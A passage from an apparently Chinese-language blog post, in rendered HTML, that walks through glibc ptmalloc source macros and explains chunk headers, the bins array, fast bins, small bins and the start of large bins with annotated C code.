class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 获取内存块大小（忽略使用标志位） */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 与 chunksize 功能类似，但不屏蔽 SIZE_BITS 标志位  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure><p><strong>获取下一个物理相邻的 chunk</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 指向下一个物理相邻的 chunk 指针。 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></span><br></pre></td></tr></table></figure><p>通过 <code>chunksize(p)</code> 获取当前块总大小（含头部），计算下一块起始地址（当前地址 + 块大小）</p><p><strong>获取前一个 chunk 的信息</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 获取 p 下方块的大小，仅当前一块空闲时有效。  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设置 p 下方块的大小。仅当 !prev_inuse(P) 时有效。  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 指向物理上前一个 malloc_chunk 的指针。仅当 !prev_inuse(P) 时有效  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span></span><br></pre></td></tr></table></figure><p><strong>当前 chunk 使用状态相关操作</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 提取 p 的使用状态位 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inuse(p)                                                               \</span></span><br><span class="line"><span class="meta">    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 提取 p 的使用状态位 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inuse(p)                                                               \</span></span><br><span class="line"><span class="meta">    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 清除块的使用状态标记，不干扰其他标志 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_inuse(p)                                                         \</span></span><br><span class="line"><span class="meta">    ((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span></span><br></pre></td></tr></table></figure><p><strong>设置 chunk 的 size 字段</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 设置头部的大小，不干扰其使用标志位 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head_size(p, s)                                                    \</span></span><br><span class="line"><span class="meta">    ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设置头部的大小/使用标志字段 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head(p, s) ((p)-&gt;mchunk_size = (s))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设置尾部的大小（仅当内存块未被使用时） */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_foot(p, s)                                                         \</span></span><br><span class="line"><span class="meta">    (((mchunkptr)((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span></span><br></pre></td></tr></table></figure><p><strong>获取指定偏移的 chunk</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 将 ptr + offset 位置的空间视为一个 chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure><p><strong>指定偏移处 chunk 使用状态相关操作</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 检查 p + s 位置的内存块的使用状态位 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inuse_bit_at_offset(p, s)                                              \</span></span><br><span class="line"><span class="meta">    (((mchunkptr)(((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设置 p + s 位置的内存块为已使用状态 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_inuse_bit_at_offset(p, s)                                          \</span></span><br><span class="line"><span class="meta">    (((mchunkptr)(((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 清除 p + s 位置的内存块的使用状态标志 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_inuse_bit_at_offset(p, s)                                        \</span></span><br><span class="line"><span class="meta">    (((mchunkptr)(((char *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))</span></span><br></pre></td></tr></table></figure><h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><ul><li><code>bin</code> 本质是双向链表，用于链接空闲的<code>chunk</code>。每 bin的 header 包含两个指针：<ul><li><code>fd</code>（forward）：指向下一个空闲 <code>chunk</code>。</li><li><code>bk</code>（backward）：指向前一个空闲 <code>chunk</code>。</li></ul></li><li>由于 <code>malloc_chunk</code> 结构体中天然包含 <code>fd</code> 和 <code>bk</code> 字段（仅在空闲时使用），<code>bin</code> 的 header 可以直接作为链表的 “虚拟头结点”，方便插入、删除操作。</li></ul><p>我们曾经说过，用户释放掉的 <code>chunk</code> 不会马上归还给系统，ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的 chunk。当用户再一次请求分配内存时，ptmalloc 分配器会试图在空闲的 chunk 中挑选一块合适的给用户。这样可以避免频繁的系统调用，降低内存分配的开销。</p><p>在具体的实现中，ptmalloc采用分箱式方法(bin)对空闲的<code>chunk</code>进行管理。首先，它会根据空闲的<code>chunk</code>的大小以及使用状态将<code>chunk</code>初步分为4类：fast bins，small bins，large bins，unsorted bin。在每类bin的内部仍然会有多个互不相关的链表来保存不同大小的chunk。</p><p>对于small bins，large bins，unsorted bin来说，ptmalloc将它们维护在同一个数组中。这些 bin 对应的数据结构在 malloc_state 中，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS 128</span></span><br><span class="line"><span class="comment">/*  如上文所述打包的常规 bins */</span></span><br><span class="line">mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br></pre></td></tr></table></figure><p><code>bins</code> 主要用于索引不同 bin 的 fd 和 bk。</p><p>为了简化在双链接列表中的使用，每个 bin 的header都设置为 malloc_chunk 类型。这样可以避免 header 类型及其特殊处理。但是，为了节省空间和提高局部性，只分配 bin 的fd&#x2F;bk 指针，然后使用repositioning tricks 将这些指针视为一个<code>malloc_chunk*</code>的字段。</p><p>以32位系统为例，bins前4项的含义如下</p><table><thead><tr><th align="left">含义</th><th align="left">bin1 的 fd&#x2F;bin2 的 prev_size</th><th align="left">bin1 的 bk&#x2F;bin2 的 size</th><th align="left">bin2 的 fd&#x2F;bin3 的 prev_size</th><th align="left">bin2 的 bk&#x2F;bin3 的 size</th></tr></thead><tbody><tr><td align="left">bin 下标</td><td align="left">0</td><td align="left">1</td><td align="left">2</td><td align="left">3</td></tr></tbody></table><p>可以看到，bin2 的 prev_size、size 和 bin1 的 fd、bks是重合的。由于我们只会使用 fd 和 bk 来索引链表，所以该重合部分的数据其实记录的是 bin1 的 fd 、bk。也就是说，虽然后一个 bin 和前一个 bin 共用部分数据，但是其实记录的仍然是前一个 bin 的链表数据。通过这样的复用，可以节省空间。</p><p>数组中的 bin 依次如下</p><p>1.第一个为 unsorted bin（未排序的箱子），这里面的<code>chunk</code>没有进行排序，存储的<code>chunk</code>比较杂。</p><p>2.索引从2到63的 bin 称为 small bin，同一个 small bin 链表中的<code>chunk</code>的大小相同。两个相邻索引的 small bin 链表中的<code>chunk</code>大小相差的字节数为<strong>2个机器字长</strong>，即32位相差8字节，64位相差16字节。</p><p>3.small bins 后面的 bin 被称作 large bins。large bins中的每一个 bin 都包含一定范围内的 chunk，其中的 chunk 按 fd 指针的顺序从大到小排列。相同大小的chunk同样按照最近使用顺序排列。</p><p>此外，上述这些 bin 的排布都会遵循一个原则: <strong>任意两个物理相邻的空闲 chunk 不能在一起</strong></p><blockquote><p><strong>示例</strong>：若内存中有块 A（已用）、块 B（空闲）、块 C（空闲），则块 B 和 C 因物理相邻违反规则，需通过分配其他数据或合并为一个大块来调整。</p></blockquote><p>需要注意的是，并不是所有的<code>chunk</code>被释放后就立即被放到 bin 中。ptmalloc 为了提高分配的速度，会把一些小的<code>chunk</code>先放到 fast bins 的容器内。而且，fastbin容器中的<code>chunk</code>的使用标记总是被置位的，所以不满足上面的原则。</p><p>bin 通用的宏如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mbinptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i)                                                           \</span></span><br><span class="line"><span class="meta">    (mbinptr)(((char *) &amp;((m)-&gt;bins[ ((i) -1) * 2 ])) -                        \</span></span><br><span class="line"><span class="meta">              offsetof(struct malloc_chunk, fd))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* analog of ++bin */</span></span><br><span class="line"><span class="comment">//获取下一个bin的地址</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr) &lt;&lt; 1)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Reminders about list directionality within bins */</span></span><br><span class="line"><span class="comment">// 这两个宏可以用来遍历bin</span></span><br><span class="line"><span class="comment">// 获取 bin 的位于链表头的 chunk</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> first(b) ((b)-&gt;fd)</span></span><br><span class="line"><span class="comment">// 获取 bin 的位于链表尾的 chunk</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> last(b) ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure><h4 id="Fast-Bin"><a href="#Fast-Bin" class="headerlink" title="Fast Bin"></a>Fast Bin</h4><p>大多数程序经常会申请以及释放一些比较小的内存块。如果将一些较小的<code>chunk</code>释放之后发现存在与之相邻的空闲的<code>chunk</code>并将它们进行合并，那么当下一次再次申请相应大小的<code>chunk</code>时，就需要对<code>chunk</code>进行分割，这样就大大降低了堆的利用效率。<strong>因为我们把大部分时间花在了合并、分割以及中间检查的过程中</strong>。因此，prmalloc中专门设计了 fast bin，对应的变量就是malloc state 中的 fastbinsY</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*/快速链表</span><br><span class="line">一个存储最近释放的小块内存的链表数组。快速链表不是双向链表。将它们单向链接会更快，而且由于内存块永远不会从这些链表的中间移除，所以双向链接没有必要。此外，与常规链表不同，它们甚至不以先进先出（FIFO）顺序处理（它们使用更快的后进先出（LIFO）顺序），因为在通常使用快速链表的临时环境中，顺序并不是很重要。</span><br><span class="line">快速链表中的内存块保持其使用位被设置，因此它们不能与其他空闲内存块合并。malloc_consolidate 函数会释放快速链表中的所有内存块，并将它们与其他空闲内存块合并*/</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    This is in malloc_state.</span></span><br><span class="line"><span class="comment">    /* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>为了更加高效地利用 fast bin，glibc采用单向链表对其中的每个bin进行组织，并且每个bin采取LIFO策略(后进先出)，最近释放的<code>chunk</code>会更早的被分配，所以会更加适合于局部性。也就是说，当用户需要的<code>chunk</code>的大小小于 fastbin 的最大大小时，ptmalloc会首先判断 fastbin 中相应的 bin 中是否有对应大小的空闲块，如果有的话，就会直接从这个 bin 中获取 chunk。如果没有的话，ptmalloc才会做接下来的一系列操作。</p><p>默认情况下(32位系统为例)，fast bin中默认支持最大的<code>chunk</code>的数据空间大小为64字节。但是其可以支持的<code>chunk</code>的数据空间最大为0x80字节。除此之外，fast bin 最多可以支持的 bin 的个数为10个，从数据空间为8字节开始一直到80字节(这里说的大小是数据空间的大小，也就是除去prev_size和size字段部分的大小)</p><p>定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DEFAULT_MXFAST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_MXFAST (64 * SIZE_SZ / 4)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 我们支持的最大快速堆块请求大小 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_FAST_SIZE (80 * SIZE_SZ / 4)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   由于max_fast的最低2位在尺寸比较中无关紧要，因此被用作标志位。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   max_fast中存储的FASTCHUNKS_BIT标志表示可能存在一些快速箱块（fastbin chunk）。</span></span><br><span class="line"><span class="comment">   当有块进入任何快速箱时，该标志设为真；仅在malloc_consolidate函数中清除该标志。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   真值取反设计是为了在启动时have_fastchunks默认为真（因为静态变量初始化为零），简化初始化检查。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 判断分配区是否存在快速箱块，1表示不存在</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FASTCHUNKS_BIT (1U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_fastchunks(M) catomic_or(&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_fastchunks(M) catomic_and(&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   NONCONTIGUOUS_BIT标志表示MORECORE不会返回连续内存区域。</span></span><br><span class="line"><span class="comment">   否则，在可能的情况下，会利用连续性合并连续MORECORE调用的结果。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   初始值来自MORECORE_CONTIGUOUS，但如果使用mmap作为sbrk的替代方案，该值会动态改变。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 判断MORECORE是否返回连续内存区域：</span></span><br><span class="line"><span class="comment">// 主分配区的MORECORE对应sbrk()，默认返回连续虚拟地址空间；</span></span><br><span class="line"><span class="comment">// 非主分配区使用mmap()分配大块内存并切分，而mmap默认不保证地址连续，因此非主分配区默认非连续。</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NONCONTIGUOUS_BIT (2U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> noncontiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_noncontiguous(M) ((M)-&gt;flags |= NONCONTIGUOUS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_contiguous(M) ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   若检测到分配区（arena）存在内存损坏，则设置ARENA_CORRUPTION_BIT标志。</span></span><br><span class="line"><span class="comment">   此类分配区不再用于分配内存块，且检测到损坏前已分配的块不会被释放。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARENA_CORRUPTION_BIT (4U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_is_corrupt(A) (((A)-&gt;flags &amp; ARENA_CORRUPTION_BIT))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_arena_corrupt(A) ((A)-&gt;flags |= ARENA_CORRUPTION_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   设置max_fast的值：</span></span><br><span class="line"><span class="comment">   - 若参数为0，则使用极小值（避免影响正常分配）。</span></span><br><span class="line"><span class="comment">   - 前置条件：当前无快速箱块存在。</span></span><br><span class="line"><span class="comment">   - 设置该值时会清除fastchunk标志，但保留非连续标志（noncontiguous bit）。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_max_fast(s)                                                        \</span></span><br><span class="line"><span class="meta">    global_max_fast =                                                          \</span></span><br><span class="line"><span class="meta">        (((s) == 0) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_max_fast() global_max_fast</span></span><br></pre></td></tr></table></figure><p>ptmalloc 默认情况下会调用 set_max_fast(s) 将全局变量 global_max_fast 设置为 DEFAULT_MXFAST，也就是设置 fast bins 中 <code>chunk</code> 的最大值。当 MAX_FAST_SIZE 被设置为 0 时，系统就不会支持 fast bins 。</p><p><strong>fastbin 的索引</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[ idx ])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="comment">// chunk size=2*size_sz*(2+idx)</span></span><br><span class="line"><span class="comment">// 这里要减2，否则的话，前两个bin没有办法索引到。</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz)                                                      \</span></span><br><span class="line"><span class="meta">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure><p><strong>需要特别注意的是，fastbin 范围的 <code>chunk</code> 的 inuse 始终被置为 1。因此它们不会和其它被释放的 <code>chunk</code> 合并。</strong></p><p>但是当释放的 <code>chunk</code> 与该 <code>chunk</code> 相邻的空闲 <code>chunk</code> 合并后的大小大于 FASTBIN_CONSOLIDATION_THRESHOLD 时，内存碎片可能比较多了，我们就需要把 fast bins 中的 chunk 都进行合并，以减少内存碎片对系统的影响。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">   FASTBIN_CONSOLIDATION_THRESHOLD是free()函数中一个块的大小，当达到这个大小，就会触发对可能相邻的快速链表块进行自动合并。这是一种启发式方法，所以具体的值并没有太大影响。它被定义为默认修剪阈值的一半，这是一种折中的启发式策略，即只有在可能导致修剪的情况下才尝试合并。然而，它不能动态调整，因为即使不使用修剪，合并也能减少大块周围的碎片。</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">#define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)</span><br></pre></td></tr></table></figure><p><strong>malloc_consolidate 函数可以将 fastbin 中所有能和其它 <code>chunk</code> 合并的 <code>chunk</code> 合并在一起。具体地参见后续的详细函数的分析。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   快速链表（fastbins）中的块会保持其已使用位（inuse bit）被设置，因此它们不能与其他空闲块合并。malloc_consolidate 函数会释放快速链表中的所有块，并将它们与其他空闲块合并。</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><p>small bins中每个<code>chunk</code>的大小与其所在的 bin 的index的关系为: chunk_size &#x3D; 2 * SIZE_SZ*index，具体如下</p><table><thead><tr><th align="left">下标</th><th align="left">SIZE_SZ&#x3D;4（32 位）</th><th align="left">SIZE_SZ&#x3D;8（64 位）</th></tr></thead><tbody><tr><td align="left">2</td><td align="left">16</td><td align="left">32</td></tr><tr><td align="left">3</td><td align="left">24</td><td align="left">48</td></tr><tr><td align="left">4</td><td align="left">32</td><td align="left">64</td></tr><tr><td align="left">5</td><td align="left">40</td><td align="left">80</td></tr><tr><td align="left">x</td><td align="left">2*4*x</td><td align="left">2*8*x</td></tr><tr><td align="left">63</td><td align="left">504</td><td align="left">1008</td></tr></tbody></table><p>small bins 中一共有62个循环双向链表，每个链表中存储的<code>chunk</code>大小都一致。比如对于32位系统来说，下标2对应的双向链表中存储的<code>chunk</code>大小均为16字节。每个链表都有链表头节点，这样可以方便对于链表内部结点的管理。此外，**small bins中每个 bin 对应的链表采用 FIFO 的规则(先进先出)**，所以同一个链表中先被释放的<code>chunk</code>会先被分配出去</p><p>small bin 相关的宏如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLBINS 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_WIDTH MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="comment">// 是否需要对small bin的下标进行纠正</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"><span class="comment">//判断chunk的大小是否在small bin范围内</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> in_smallbin_range(sz)                                                  \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span></span><br><span class="line"><span class="comment">// 根据chunk的大小得到small bin对应的索引。</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz)                                                     \</span></span><br><span class="line"><span class="meta">    ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4)                          \</span></span><br><span class="line"><span class="meta">                           : (((unsigned) (sz)) &gt;&gt; 3)) +                       \</span></span><br><span class="line"><span class="meta">     SMALLBIN_CORRECTION)</span></span><br></pre></td></tr></table></figure><p><strong>或许，大家会很疑惑，那 fast bin 与 small bin 中 <code>chunk</code> 的大小会有很大一部分重合啊，那 small bin 中对应大小的 bin 是不是就没有什么作用啊？</strong> 其实不然，fast bin 中的 <code>chunk</code> 是有可能被放到 small bin 中去的，我们在后面分析具体的源代码时会有深刻的体会。</p><h4 id="Large-Bin"><a href="#Large-Bin" class="headerlink" title="Large Bin"></a>Large Bin</h4><p>large bins 中一共包括 63 个 bin，每个 bin 中的 <code>chunk</code> 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 <code>chunk</code> 大小之间的公差一致，具体如下：</p><table><thead><tr><th align="left">组</th><th align="left">数量</th><th align="left">公差</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">32</td><td align="left">64B</td></tr><tr><td align="left">2</td><td align="left">16</td><td align="left">512B</td></tr><tr><td align="left">3</td><td align="left">8</td><td align="left">4096B</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">32768B</td></tr><tr><td align="left">5</td><td align="left">2</td><td align="left">262144B</td></tr><tr><td align="left">6</td><td align="left">1</td><td align="left">不限制</td></tr></tbody></table><p>这里我们以32位平台的large bin 为例，第一个large bin 的其实<code>chunk</code>大小为512字节，位于第一组，所以该bin可以存储的<code>chunk</code>的大小范围为[512,512+64）。</p><p>关于large bin 的宏如下，这里我们以32位平台下，第一个large bin 的起始<code>chunk</code>大小为例，为512字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 